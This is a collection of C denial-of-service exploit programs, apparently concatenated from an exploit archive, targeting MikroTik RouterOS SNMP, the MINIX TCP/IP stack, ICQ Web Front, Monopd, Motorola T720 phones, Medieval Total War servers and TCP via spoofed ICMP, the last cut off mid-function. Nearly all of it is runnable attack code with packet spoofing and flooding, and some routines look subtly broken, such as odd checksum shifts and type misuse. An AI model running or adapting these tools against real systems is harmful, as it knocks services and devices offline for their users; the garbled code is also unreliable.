*        hellknights.void.ru    |___/  .0x48k.    
*
* --------------------------------------------------------------------------
*
*  MicroTik RouterOS <=3.2 SNMPd snmp-set DoS exploit. Other OSs may be vulnurable (fe. Linux )
*  Don't forget to visit our site and my homepage for new releases:
*  http://hellknights.void.ru
*  http://shados.freeweb7.com
*  Also, you can mail me any bugs or suggestions:
*  mailto: shados /at/ mail /dot/ ru
*
*  Thanks 2 antichat.ru and all my friends.
* --------------------------------------------------------------------------
*
*  Copyright (C) 89, 90, 91, 1995-2007 Free Software Foundation.
*
*  This program is free software; you can redistribute it and/or modify
*  it under the terms of the GNU General Public License as published by
*  the Free Software Foundation; either version 2, or (at your option)
*  any later version.
*
*  This program is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU General Public License for more details.
*
*  You should have received a copy of the GNU General Public License
*  along with this program; if not, write to the Free Software Foundation,
*  Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
*
* --------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <memory.h>
#include <string.h>

char evilcode[] = {
0x19, 0x02, 0x02, 0x1e, 0x0c, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0d, 0x30, 0x0b, 0x06, 0x07, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x05, 0x00, 0x00
};


unsigned short in_cksum(addr, len)
u_short *addr;
int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1) {
     sum += *w++;
     sum += *w++;
     nleft -= 2;
  }
  if (nleft == 1) {
     *(u_char *) (&answer) = *(u_char *) w;
     sum += answer;
  }
  sum = (sum >> 17) + (sum & 0xffff);
  sum += (sum >> 17);
  answer = -sum;
  return (answer);
}

int sendudp(int sock,unsigned long *saddr, unsigned long *daddr,unsigned int sport,unsigned int dport,char *data, int len)
{
  char *packet;
  struct sockaddr_in dstaddr;
  struct iphdr *ip;
  struct udphdr *udp;
  packet = (char *)malloc(sizeof(struct iphdr)+sizeof(struct udphdr)+len);
  memset(packet,0,sizeof(struct iphdr) + sizeof(struct udphdr) + len);
  if (packet == NULL) { perror("Malloc failed\n"); exit(-1); }
  ip = (struct iphdr *)packet;
  udp = (struct udphdr *)(packet+sizeof(struct iphdr));
  ip->saddr = *saddr;
  ip->daddr = *daddr;
  ip->version = 4;
  ip->ihl = 5;
  ip->ttl = 255;
  ip->id = htons((unsigned short) rand());
  ip->protocol = IPPROTO_UDP;
  ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr)+len);
  ip->check = in_cksum(ip, sizeof(struct iphdr));
  udp->source = htons(sport);
  udp->dest = htons(dport);
  udp->len = htons(sizeof(struct udphdr) + len);
  memcpy(packet+(sizeof(struct iphdr) + sizeof(struct udphdr)),data,len);
  dstaddr.sin_family = AF_INET;
  dstaddr.sin_addr.s_addr = *daddr;
  if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct udphdr)+len,0,(struct sockaddr *)&dstaddr,sizeof(struct sockaddr_in)) < 0)
    perror("sendto() failed");
  free(packet);
}

char * makereq(char *community,int *size)
{
 char *buf;
 char *ptr;
 int len;
 int i;

 len = 5 + strlen(community) + sizeof(evilcode);
 buf = (char *)malloc(len);
 ptr = buf;

 *ptr++ = 0x30;
 *ptr++ = len;
 
 /* Snmp Version */
 *ptr++ = 0x02;
 *ptr++ = 0x01;
 *ptr++ = 0x00;
 
 /* Community */
 *ptr++ = 0x04;
 *ptr++ = strlen(community);
 strcpy(ptr,community);
 ptr = ptr + strlen(community);
 
 
 *ptr++ = 0xa3; /* Set Request */
 
 memcpy(ptr, evilcode, sizeof(evilcode));
 ptr = ptr + sizeof(evilcode);
 
 *size = len+2;
 return buf;
}

int erexit(char *msg)
{
 printf("%s\n",msg);
 exit (-1) ;
}

int usage()
{
 printf("Usage: ./snmpdos <-s source> <-d dest> <-c community>\n");
}

int main(int argc, char **argv)
{
 char *saddr,*daddr,*community;
 unsigned char *buf;
 int size;
 int sock;
 unsigned long lsaddr,ldaddr;
 int i;

 saddr = NULL;
 daddr = NULL;
 if (argc != 7) { usage(); erexit("not enough args\n"); }

 if (!strcmp(argv[1],"-s"))
   saddr = strdup(argv[2]);
 if (!strcmp(argv[3],"-d"))
   daddr = strdup(argv[4]);
 if (!strcmp(argv[5],"-c"))
   community = strdup(argv[6]);

 printf("Ok, spoofing packets from %s to %s\n",saddr,daddr);

 if (inet_addr(saddr) == -1 || inet_addr(daddr) == -1)
   erexit("Invalid source/destination IP address\n");

 if (saddr == NULL) { usage(); erexit("No Source Address"); }
 if (daddr == NULL) { usage(); erexit("No Dest Address"); }

 sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
 if (sock == -1)
   erexit("Couldnt open Raw socket!(Are you root?)\n");

 lsaddr = inet_addr(saddr);
 ldaddr = inet_addr(daddr);

 buf = makereq(community,&size);

 sendudp(sock,&lsaddr,&ldaddr,32788,161,buf,size);
 fprintf(stdout,"Sent packet. SNMPd must be down.\n");
 return 0;

}
/*
  _-------------------------------------------------------_
 ||------+  MINIX <= 3.3.0 Remote TCP/IP Stack DoS +------||
 ||_______________________________________________________||
 ||--=[ Alejandro Hernandez < nitr0us >               ]=--||
 ||--=[ Nov 2014                                      ]=--||
 ||--=[ Mexico                                        ]=--||
  -_______________________________________________________-
_____________________________________________________________________________________

 MINIX IS PRONE TO DENIAL OF SERVICE IN THE TCP/IP STACK (/service/inet) BY SENDING 
 A SINGLE TCP PACKET WITH A MALFORMED TCP OPTION. A TCP OPTION WITH LENGTH OF ZERO
 WOULD CAUSE inet TO END UP IN AN INFINITE LOOP.

 BECAUSE OF MINIX'S MICROKERNEL NATURE, THE NETWORKING SERVICE RUNS IN USERLAND AND 
 THEREFORE, THE MOST CRITICAL PARTS OF THE RUNNING KERNEL ARE UNAFFECTED.

 THIS ISSUE HAS BEEN REPORTED AND ALREADY FIXED:
 https://github.com/Stichting-MINIX-Research-Foundation/minix/issues/7
_____________________________________________________________________________________

 MINIX 3
 http://minix3.org

 Microkernel (Slide 26)
 http://www.eecs.harvard.edu/~mdw/course/cs161/notes/osstructure.pdf

 TCP Option Kind Numbers
 http://www.iana.org/assignments/tcp-parameters/tcp-parameters.xhtml#tcp-parameters-1
_____________________________________________________________________________________

*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#define __FAVOR_BSD 1    /* Use BSD's tcp header style */
#include <netinet/tcp.h>

#define IPSIZE	sizeof(struct ip)
#define TCPSIZE	sizeof(struct tcphdr)

#define DEFAULT_SRC_IP	"1.3.3.7"

uint16_t _checksum(uint16_t * addr, int len) {
	int nleft = len;
	int sum = 0;

	uint16_t *w = addr;
	uint16_t answer = 0;

	while(nleft > 1){
		sum += *w++;
		nleft -= sizeof(uint16_t);
	}

	if(nleft == 1){
		*(uint8_t *) (&answer) = *(uint8_t *) w;
		sum += answer;
	}

	sum    =  (sum >> 16) + (sum & 0xffff);
	sum    += (sum >> 16);
	answer =  ~sum;

	return (answer);
}

int main(int argc, char **argv)
{
	char *packet= (char *) malloc(IPSIZE + TCPSIZE + 4);
	char *srcip = DEFAULT_SRC_IP;
	int sockfd, count;
	int pseudo_hdr_size = 12 + TCPSIZE + 4; // 12 bytes for the pseudo-header; 4 bytes for the payload
	int one = 1; /* setsockopt() */
	struct sockaddr_in target;
	struct hostent *host2ip;
	struct ip *IP = (struct ip *) packet;
	struct tcphdr *TCP = (struct tcphdr *) (packet + IPSIZE);
	unsigned char pseudo_hdr_for_checksum[pseudo_hdr_size];

	if(argc < 2){
		printf("  _-------------------------------------------------------_\n");
		printf(" ||------+  MINIX <= 3.3.0 Remote TCP/IP Stack DoS +------||\n");
		printf("  -_______________________________________________________-\n\n");
		printf("Usage: %s <IP>\n", argv[0]);

		exit(-1);
	}

	if((host2ip = gethostbyname(argv[1])) == NULL){
		perror("gethostbyname");
		exit(-1);
	}

	if(getuid() != 0){
		fprintf(stderr, "You must be root to create raw sockets.\n");
		exit(-1);
	}

	memset(packet, 0x00, sizeof(packet));
	memset(&target, 0x00, sizeof(target));

	target.sin_family	= AF_INET;
	target.sin_port		= htons(31337);
	target.sin_addr		= *((struct in_addr *)host2ip->h_addr);

	/*** SEMI-VALID TCP/IP PACKET ***/
	IP->ip_src.s_addr = inet_addr(srcip);
	IP->ip_dst.s_addr = target.sin_addr.s_addr;
	IP->ip_hl	= 0x05;
	IP->ip_v	= 0x04;
	IP->ip_tos	= 0x00;
	IP->ip_len	= htons(IPSIZE + TCPSIZE + 4);
	IP->ip_id	= 0x01;
	IP->ip_ttl	= 0xff;
	IP->ip_p	= IPPROTO_TCP;
	IP->ip_sum	= _checksum((uint16_t *) IP, IPSIZE);

	TCP->th_sport	= htons(0xcafe);
	TCP->th_dport	= htons(31337);
	TCP->th_seq	= htonl(rand());
	TCP->th_ack	= htonl(rand());
	TCP->th_off	= ((TCPSIZE + 4) / 4);
	TCP->th_win	= htons(0x1337);
	TCP->th_flags	= rand() & 0x0f;
	TCP->th_sum	= 0x00;

	/* Malformed TCP Options
	Initially tested with "\x03\x00\x00\x00" but realized that MINIX 3 hangs even with 2, 3, 4, 5, 
	6, 7, 8, 0x7f, 0xff, in the first byte. Then, I found out that if the option size (the 2nd byte) 
	is higher than zero, the stack doesn't hang. For this PoC, "\xff\x00\x00\x00" is used: */
	memcpy(packet + IPSIZE + TCPSIZE, "\xff\x00\x00\x00", 4);

	// TCP Checksum Calculation and the TCP "Pseudo Header" 
	// http://www.tcpipguide.com/free/t_TCPChecksumCalculationandtheTCPPseudoHeader-2.htm
	memset(pseudo_hdr_for_checksum, 0x00, pseudo_hdr_size);
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  0)) = IP->ip_src.s_addr;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  4)) = IP->ip_dst.s_addr;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  8)) = 0x00;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum +  9)) = IPPROTO_TCP;
	*((unsigned long *)((unsigned char *) pseudo_hdr_for_checksum + 10)) = htons(TCPSIZE + 4);
	memcpy(pseudo_hdr_for_checksum + 12, ((unsigned char *) packet) + IPSIZE, TCPSIZE + 4);

	TCP->th_sum	= _checksum((uint16_t *) &pseudo_hdr_for_checksum, pseudo_hdr_size);

	printf("-=[ Computed IP header checksum:  IP->ip_sum  = 0x%x\n", IP->ip_sum);
	printf("-=[ Computed TCP header checksum: TCP->th_sum = 0x%x\n\n", TCP->th_sum);
	printf("-=[ Sending malformed TCP/IP packet...\n\n");

	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
		perror("socket");
		exit(-1);
	}

	if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) == -1){
		perror("setsockopt");
		exit(-1);
	}

	if((count = sendto(sockfd, packet, IPSIZE + TCPSIZE + 4, 0, (struct sockaddr *) &target, sizeof(target))) == -1){
		perror("sendto");
		close(sockfd);
		exit(-1);
	}

	close(sockfd);

	printf("-=[ Sent %d bytes to %s:31337\n", count, argv[1]);
	printf("-=[ TCP/IP stack should be hanged now\n");
	printf("-=[ Try to ping %s... \n", argv[1]);

	return 0;
}
source: http://www.securityfocus.com/bid/1463/info

The guestbook CGI program in ICQ Web Front service for ICQ 2000a, 99b, and others allows remote attackers to cause a denial of service via a URL with a long name parameter.

/* ICQ Web Front DoS */

#include <sys/socket.h> 
#include <stdio.h> 
#include <netinet/in.h>
#include <netdb.h>

void main(int argc, char *argv[]) 
{ 
  int sock;
  struct in_addr addr; 
  struct sockaddr_in sin; 
  struct hostent *he; 
  unsigned long start; 
  unsigned long end; 
  unsigned long counter;  
  
  /* added extra ? to be on the safe side :) */
  char xploitstr1[50]="GET /?????????? HTTP/1.0 \n\n";
  
  
  printf("ICQ Web Front DoS - author: char0hlz/tPG\n");  
  printf("The Poor Gurus' Network [http://www.tpgn.net]\n");

  if (argc<2) 
  { 
    printf("usage: %s <hostname>\n", argv[0]); 
    exit(0); 
  } 
  if ((he=gethostbyname(argv[1])) == NULL) 
  { 
    herror("gethostbyname"); 
    exit(0); 
  }  
    start=inet_addr(argv[1]); 
    counter=ntohl(start); 
    sock=socket(AF_INET,SOCK_STREAM,0); 
    bcopy(he->h_addr,(char *)&sin.sin_addr, he->h_length); 
    sin.sin_family=AF_INET; 
    sin.sin_port=htons(80); 
    if (connect(sock,(struct sockaddr*)&sin,sizeof(sin))!=0) 
    { 
      perror("pr0blemz"); 
    } 
    send(sock,xploitstr1,strlen(xploitstr1),0);
    close(sock);
    
   printf("Done. Refresh the page to see if it worked.\n"); 
} /*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define stristr strcasestr
    #define ONESEC  1
#endif



#define VER         "0.1"
#define PORT        1234
#define BUFFSZ      65535   // this is a lot, 20000 is enough



int recv_xml(int sd, u_char *data, int size);
int create_rand_string(u_char *data, int len, u_int *seed);
u_int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    u_int   seed;
    int     sd,
            i,
            len;
    u_short port = PORT;
    u_char  *buff;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    srand(time(NULL));
    setbuf(stdout, NULL);

    fputs("\n"
        "Monopd <= 0.9.3 DoS "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n",
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    printf("- connect...");
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    printf(" done\n");

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

    printf("- receive version:\n");
    len = recv_xml(sd, buff, BUFFSZ);
    if(len < 0) goto quit;
    printf("  %s\n", buff);

    printf("- start DoS attack\n");
    seed = time(NULL);
    buff[0] = '.';  // .n, but also .pi is ok
    buff[1] = 'n';

    for(;;) {
        create_rand_string(buff + 2, BUFFSZ - 3, &seed);
        buff[BUFFSZ - 1] = '\n';
        if(send(sd, buff, BUFFSZ, 0) <= 0) break;

        for(i = 5; i >= 0; i--) {
            printf("%3d\r", i);
            sleep(ONESEC);
        }
    }

quit:
    close(sd);
    printf("- server has interrupted the connection\n");
    return(0);
}



int recv_xml(int sd, u_char *data, int size) {
    int     i;
    u_char  *p;

    p = data;
    size--;
    for(i = 0; i < size; i++) {
        if(recv(sd, p, 1, 0) <= 0) return(-1);
        p++;
        *p = 0;
        if(stristr(data, "</monopd>")) break;
    }
    return(i);
}



int create_rand_string(u_char *data, int len, u_int *seed) {
    u_int   rnd;
    u_char  *p = data;
    const static u_char table[] =
                "&"
                "<"
                ">"
                "\"";

    rnd = *seed;

    while(len--) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd >>= 3;
        *p++ = table[rnd % (sizeof(table) - 1)];
    }
    *p = 0;

    *seed = rnd;
    return(p - data);
}



u_int resolv(char *host) {
    struct  hostent *hp;
    u_int   host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_int *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


source: http://www.securityfocus.com/bid/9779/info

The Motorola T720 has been reported prone to a remote denial of service vulnerability. The issue presents itself when the phone handles excessive IP based traffic under certain circumstances.

An attacker may potentially exploit this issue to cause a target phone to crash.

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

int main(int argc, char *argv[]) {
        if(argc < 2) {
                printf("Usage: %s <host>\n", argv[0]);
                exit(0);
        }

        int sock;
        char packet[5000];
        int on = 1;
        struct sockaddr_in dest;
        struct hostent *host;
        struct iphdr *ip = (struct iphdr *) packet;
        struct icmphdr *icmp = (struct icmp *) packet
+ sizeof(struct iphdr);
        if((host = gethostbyname(argv[1])) == NULL) {
                printf("Couldn't resolve host!\n");
                exit(-1);
        }

        if((sock = socket(AF_INET, SOCK_RAW,
IPPROTO_ICMP)) == -1) {
                printf("Couldn't make socket!\n");
                printf("You must be root to create a
raw socket.\n");
                exit(-1);
        }

        if((setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
(char *)&on, sizeof(on))) < 0) {
        perror("setsockopt");
        exit(1);
        }

        dest.sin_family = AF_INET;
        dest.sin_addr = *((struct in_addr
*)host->h_addr);
        ip->ihl = 5;
        ip->id = htons(1337);
        ip->ttl = 255;
        ip->tos = 0;
        ip->protocol = IPPROTO_ICMP;
        ip->version = 4;
        ip->frag_off = 0;
        ip->saddr = htons("1.3.3.7");
        ip->daddr = inet_ntoa(dest.sin_addr);
        ip->tot_len = sizeof(struct iphdr) +
sizeof(struct icmphdr);
        ip->check = 0;
        icmp->checksum = 0;
        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        printf("Ping flooding %s!\n", argv[1]);

        /* begin flooding here. */
        while(1) {
                sendto(sock, packet, ip->tot_len, 0,
(struct sockaddr *)&dest, sizeof(struct sockaddr));
        }
        return(0);
}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif








#define VER     "0.1"
#define PORT    18321
#define BUFFSZ  1024
#define TIMEOUT 5
#define S1      "\x00\x00\x81\x00\x00\x00\x00"









void unicode_memset(u_char *to, u_char chr, u_long len);
void show_word(u_char *buff, int num);
void timeout(int sock);
u_long resolv(char *host);
void std_err(void);










int main(int argc, char *argv[]) {
    u_char  *buffsend,
            *buffrecv;
    struct  sockaddr_in     peer;
    int     sd,
            err,
            plen,
            blen;
    u_long  key;
    u_short port = PORT;


    setbuf(stdout, NULL);

    fputs("\n"
        "Medieval Total War <= 1.1 broadcast kick and crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n\n"
        "All the clients connected to the server and the same server in the Lobby\n"
        "screen will be kicked or crashed immediately\n"
        "\n", stdout);

    if(argc < 3) {
        printf("\nUsage: %s <num_of_chars*> <host> [port(%d)]\n"
            "\n"
            "* Number of Unicode chars in the nickname:\n"
            "0  = \"Connection expired\" denial of service\n"
            "76 = crash. You can also use bigger amout of chars to test other exceptions\n"
            "     (FYI each unicode char is 2 bytes long)\n"
            "\n", argv[0], PORT);
        exit(1);
    }



#ifdef WIN
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif


    if(argc > 3) port = atoi(argv[3]);

    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;
    plen                 = sizeof(peer);




    buffrecv = malloc(BUFFSZ + 1);
    if(!buffrecv) std_err();



        /* UDP */

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("Getting the challenge key of the remote server...\n\n", stdout);

    err = sendto(sd, "\x48\x00\xff\xff\xff", 5, 0, (struct sockaddr *)&peer, plen);
    if(err < 0) std_err();

    while(1) {
        timeout(sd);
        err = recvfrom(sd, buffrecv, BUFFSZ, 0, (struct sockaddr *)&peer, &plen);
        if(err < 0) std_err();

        if(*buffrecv == 0x49) {
            show_word(buffrecv + 0x29, 4);
            key = *(u_long *)(buffrecv + 5);
            printf("Challenge key: %lu\n", key);
            break;
        } else {
            show_word(buffrecv + 1, 1);
        }
    }

    close(sd);



        /* buffer */

    err = atoi(argv[1]) << 1;
    blen = 7 + err + 10;
    buffsend = malloc(blen);
    if(!buffsend) std_err();
    memcpy(buffsend, S1, 7);
    memcpy(buffsend + 3, &key, 4);
    unicode_memset(buffsend + 7, 'a', err >> 1);
    memset(buffsend + 7 + err, 0x00, 10);




        /* TCP */

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();
    err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
    if(err < 0) std_err();
    err = send(sd, buffsend, blen, 0);
    if(err < 0) std_err();

    timeout(sd);
    err = recv(sd, buffrecv, BUFFSZ, 0);
    if(err < 0) std_err();

    close(sd);


    if(*buffrecv == 0x02) {
        fputs("\nRemote server is full or the game is already started, so you cannot exploit it!\n", stdout);
    } else {
        fputs("\nMalicious login informations successfully sent\n\n", stdout);
    }

    return(0);
}








void unicode_memset(u_char *to, u_char chr, u_long len) {
    for(; len > 0; len--) {
        *to++ = 0x00;
        *to++ = chr;
    }
}







        /* too lame, but this is only a proof-of-concept */
void show_word(u_char *buff, int num) {
    int i;

    if(*buff) buff++;       // too lame
    buff++;                 // skip the first zero
    for(i = 0; i < num; i++) {
        switch(i) {
            case 0: {
                if(num == 1) fputs("Admin name:    ", stdout);
                    else fputs("Map name:      ", stdout);
                } break;
            case 1: fputs("Server name:   ", stdout); break;
            case 2: fputs("Password:      ", stdout); break;
            case 3: fputs("Campaign:      ", stdout); break;
            default: fputs("Info:          ", stdout); break;
        }
        while(*buff) {
            fputc(*buff, stdout);
            buff += 2;
        }
        fputc('\n', stdout);
        buff += 2;
    }
}







void timeout(int sock) {
    struct  timeval timeout;
    fd_set  fd_read;
    int err;


    timeout.tv_sec = TIMEOUT;
    timeout.tv_usec = 0;

    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &timeout);
    if(err < 0) std_err();
    if(err == 0) {
        printf("\nError: Socket timeout, no answers received\n");
        exit(1);
    }
}







u_long resolv(char *host) {
    struct      hostent *hp;
    u_long      host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n",
                host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}









#ifndef WIN
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/* HOD-icmp-attacks-poc.c: 2005-04-15: PUBLIC v.0.2
*
* Copyright (c) 2004-2005 houseofdabus.
*
*              (MS05-019) (CISCO:20050412)
*       ICMP attacks against TCP (Proof-of-Concept)
*
*
*
*                 .::[ houseofdabus ]::.
*
*
*
* [ for more details:
* [ http://www.livejournal.com/users/houseofdabus
* ---------------------------------------------------------------------
* Systems Affected:
*    - Cisco Content Services Switch 11000 Series (WebNS)
*    - Cisco Global Site Selector (GSS) 4480 1.x
*    - Cisco IOS 10.x
*    - Cisco IOS 11.x
*    - Cisco IOS 12.x
*    - Cisco IOS R11.x
*    - Cisco IOS R12.x
*    - Cisco IOS XR (CRS-1) 3.x
*    - Cisco ONS 15000 Series
*    - Cisco PIX 6.x
*    - Cisco SAN-OS 1.x (MDS 9000 Switches)
*    - AIX 5.x
*    - Windows Server 2003
*    - Windows XP SP2
*    - Windows XP SP1
*    - Windows 2000 SP4
*    - Windows 2000 SP3
*      ...
*
* ---------------------------------------------------------------------
* Description:
*    A denial of service vulnerability exists that could allow an
*    attacker to send a specially crafted Internet Control Message
*    Protocol (ICMP) message to an affected system. An attacker who
*    successfully exploited this vulnerability could cause the affected
*    system to reset existing TCP connections, reduce the throughput
*    in existing TCP connections, or consume large amounts of CPU and
*    memory resources.
*    (CAN-2004-0790, CAN-2004-0791, CAN-2004-1060)
*
* ---------------------------------------------------------------------
* Solution:
*    http://www.microsoft.com/technet/security/Bulletin/MS05-019.mspx
*    http://www.cisco.com/warp/public/707/cisco-sa-20050412-icmp.shtml
*
* Other References:
*    http://www.gont.com.ar/drafts/icmp-attacks-against-tcp.html
*    http://www.kb.cert.org/vuls/id/222750
*
* ---------------------------------------------------------------------
* Tested on:
*    - Windows Server 2003
*    - Windows XP SP1
*    - Windows 2000 SP4
*    - Cisco IOS 11.x
*
* ---------------------------------------------------------------------
* Compile:
*
* Win32/VC++  : cl -o HOD-icmp-attacks-poc HOD-icmp-attacks-poc.c
* Win32/cygwin: gcc -o HOD-icmp-attacks-poc HOD-icmp-attacks-poc.c
* Linux       : gcc -o HOD-icmp-attacks-poc HOD-icmp-attacks-poc.c
*
* ---------------------------------------------------------------------
* Examples:
*
*   client <---> router <---> router <---> server
*
*   CLIENT <---> SERVER
*
*   HOD-icmp.exe -fi:serverIP -ti:clientIP -fp:80 -tp:1023 -a:1
*   (abort the connection)
*
*   HOD-icmp.exe -fi:serverIP -ti:clientIP -fp:80 -tp:1023 -a:2
*   (slow down the transmission rate for traffic)
*
*
*   ROUTER1 <---> ROUTER2
*
*   HOD-icmp.exe -fi:routerIP2 -ti:routerIP1 -fp:179 -a:1
*   (DoS Cisco BGP Connections)
*
*   HOD-icmp.exe -fi:routerIP2 -ti:routerIP1 -fp:80 -a:2
*   (slow down the transmission rate for traffic)
*
* ---------------------------------------------------------------------
*
* This is provided as proof-of-concept code only for educational
* purposes and testing by authorized individuals with permission
* to do so.
*
*/

/* #define _WIN32 */

#ifdef _WIN32
#pragma comment(lib,"ws2_32")
#pragma pack(1)
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
/* IP_HDRINCL */
#include <ws2tcpip.h>

#else
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/timeb.h>
#endif

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#define MAX_PACKET         4096

#define DEFAULT_PORT       80
#define DEFAULT_IP         "192.168.0.1"
#define DEFAULT_COUNT      1

/* Define the IP header */
typedef struct ip_hdr {
       unsigned char  ip_verlen;       /* IP version & length */
       unsigned char  ip_tos;          /* IP type of service */
       unsigned short ip_totallength;  /* Total length */
       unsigned short ip_id;           /* Unique identifier */
       unsigned short ip_offset;       /* Fragment offset field */
       unsigned char  ip_ttl;          /* Time to live */
       unsigned char  ip_protocol;     /* Protocol */
       unsigned short ip_checksum;     /* IP checksum */
       unsigned int   ip_srcaddr;      /* Source address */
       unsigned int   ip_destaddr;     /* Destination address */
} IP_HDR, *PIP_HDR;

/* Define the ICMP header */
/* Destination Unreachable Message */
typedef struct icmp_hdr {
       unsigned char  type;            /* Type */
       unsigned char  code;            /* Code */
       unsigned short checksum;        /* Checksum */
       unsigned long  unused;          /* Unused */
} ICMP_HDR, *PICMP_HDR;

/* 64 bits of Original Data Datagram (TCP header) */
char msg[] =
"\x00\x50"                              /* Source port */
"\x00\x50"                              /* Destination port */
"\x23\x48\x4f\x44";

/* globals */
unsigned long   dwToIP,                 /* IP to send to */
               dwFromIP;               /* IP to send from (spoof) */
unsigned short  iToPort,                /* Port to send to */
               iFromPort;              /* Port to send from (spoof) */
unsigned long   dwCount;                /* Number of times to send */
unsigned long   Attack;

void
usage(char *progname) {
       printf("Usage:\n\n");
       printf("%s <-fi:SRC-IP> <-ti:VICTIM-IP> <-fi:SRC-PORT> [-tp:int] [-a:int] [-n:int]\n\n", progname);
       printf("       -fi:IP    From (sender) IP address\n");
       printf("       -ti:IP    To (target) IP address\n");
       printf("       -fp:int   Target open TCP port number\n");
       printf("                 (for example - 21, 25, 80)\n");
       printf("       -tp:int   Inicial value for bruteforce (sender) TCP port number\n");
       printf("                 (default: 0 = range of ports 0-65535)\n");
       printf("       -n:int    Number of packets\n\n");
       printf("       -a:int    ICMP attacks:\n");
       printf("                    1 - Blind connection-reset attack\n");
       printf("                        (ICMP protocol unreachable)\n");
       printf("                    2 - Path MTU discovery attack\n");
       printf("                        (slow down the transmission rate)\n");
       printf("                    3 - ICMP Source Quench attack\n");
       exit(1);
}

void
ValidateArgs(int argc, char **argv)
{
       int i;

       iToPort = 0;
       iFromPort = DEFAULT_PORT;
       dwToIP = inet_addr(DEFAULT_IP);
       dwFromIP = inet_addr(DEFAULT_IP);
       dwCount = DEFAULT_COUNT;
       Attack = 1;

       for (i = 1; i < argc; i++) {
               if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
                       switch (tolower(argv[i][1])) {
                               case 'f':
                                       switch (tolower(argv[i][2])) {
                                               case 'p':
                                                       if (strlen(argv[i]) > 4)
                                                       iFromPort = atoi(&argv[i][4]);
                                                       break;
                                               case 'i':
                                                       if (strlen(argv[i]) > 4)
                                                       dwFromIP = inet_addr(&argv[i][4]);
